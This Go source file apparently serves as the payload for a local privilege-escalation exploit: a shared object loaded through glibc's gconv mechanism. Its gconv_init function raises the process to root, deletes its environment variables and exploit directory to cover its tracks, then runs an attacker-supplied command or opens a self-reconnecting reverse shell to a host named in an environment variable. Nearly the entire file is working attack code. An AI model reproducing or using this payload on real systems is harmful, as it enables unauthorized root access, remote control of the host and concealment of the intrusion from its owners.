package payload_template

import "C"
import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
)

const path = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin"

/*
 * Malicious function called as root
 */
func malici0us() {

	// Retrieve command and exploit directory from environment variables
	payload, foundPayload := syscall.Getenv("COMMAND")
	dir, foundDir := syscall.Getenv("PKDIR")
	revShell, foundRevShell := syscall.Getenv("REV")
	if (!foundPayload && !foundRevShell) || !foundDir {
		return
	}

	// Clean trails by removing environment variables and exploit temporary directory
	syscall.Unsetenv("COMMAND")
	syscall.Unsetenv("PKDIR")
	syscall.Unsetenv("REV")
	os.Chdir("/")
	os.RemoveAll(dir)

	if revShell != "" {
		reverseShell(revShell)
	} else {
		argv := []string{"/bin/sh", "-c", fmt.Sprintf("\"%s\"", payload)}
		envv := []string{path}
		syscall.Exec("/bin/sh", argv, envv)
	}
}

/*
 * Optional reverse-shell
 * Recursive calls are used for automatic reconnection
 */
func reverseShell(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverseShell(host)
	}

	cmd := exec.Command("/bin/sh")
	cmd.Env = []string{path}
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverseShell(host)
}

/*
 * Called upon shared object loading by glibc.
 */
//export gconv_init
func gconv_init() {
	if err := syscall.Setuid(0); err != nil {
		log.Fatalf("setuid failed: %v", err)
	}
	if err := syscall.Setgid(0); err != nil {
		log.Fatalf("setgid failed: %v", err)
	}
	if err := syscall.Seteuid(0); err != nil {
		log.Fatalf("seteuid failed: %v", err)
	}
	if err := syscall.Setegid(0); err != nil {
		log.Fatalf("Psetegid failed: %v", err)
	}

	malici0us()
}

/*
 * glibc checks for this function when loading the shared object. It
 * is never called, but if it does not exist, an assertion fails.
 */
//export gconv
func gconv() {}

// Required to build
func main() {}
